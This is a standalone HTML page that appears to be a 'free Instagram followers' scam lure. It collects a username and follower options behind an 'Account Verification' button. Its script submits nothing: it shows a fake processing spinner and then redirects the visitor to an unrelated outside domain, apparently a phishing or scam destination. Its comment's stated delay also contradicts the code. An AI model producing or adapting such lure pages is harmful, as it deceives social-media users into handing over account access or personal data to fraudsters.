<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get Free Instagram Followers</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #141414 ;
            text-align: center;
            color: #bd4d4d;
            padding: 50px;
        }

        h1 {
            color: #a00d56;
            font-size: 36px;
            margin-bottom: 20px;
        }

        .container {
            background-color: #100f0f;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.107);
            display: inline-block;
        }

        input[type="text"], select {
            width: 94%;
            padding: 10px;
            margin: 10px 0;
            border: 4px solid #a00d56;
            border-radius: 5px;
            font-size: 16px;
        }

        input[type="radio"] {
            margin: 0 10px;
        }

        .button {
            background-color: #b80819;
            color: white;
            padding: 15px 25px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background-color: #e9d715;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #0dc25e;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <h1>Get Free Instagram Followers</h1>

    <div class="container">
        <form id="followersForm">
            <!-- Username Input -->
            <h3 for="username">Enter your Instagram Username:</h3>
            <input type="text" id="username" name="username" placeholder="@yourusername" required>
            
            <!-- Speed Selection -->
            <h3 for="speed">Select Speed:</h3><br>
            <input type="radio" id="speed10" name="speed" value="10" required> 10 followers / 1hour
            <input type="radio" id="speed50" name="speed" value="50"> 50 followers / 1hour
            <input type="radio" id="speed100" name="speed" value="100"> 100 followers / 1hour<br>
            
            <!-- Limit Selection -->
            <h3 for="limit">Select Followers:</h3>
            <select id="limit" name="limit" required>
                <option value="1000">1000 followers</option>
                <option value="500">500 followers</option>
                <option value="10">10 followers</option>
            </select>
            
            <!-- Confirm Button -->
            <button type="button" class="button" onclick="submitForm()">Account Verification</button>
        </form>

        <!-- Loading Spinner -->
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your Username...</p>
        </div>
    </div>

    <script>
        function submitForm() {
            // Hide form, show loading spinner
            document.getElementById('followersForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Simulate 5 second delay before redirect
            setTimeout(function() {
                window.location.href = "https://hhskj.com";
            }, 10000);
        }
    </script>

</body>
</html>
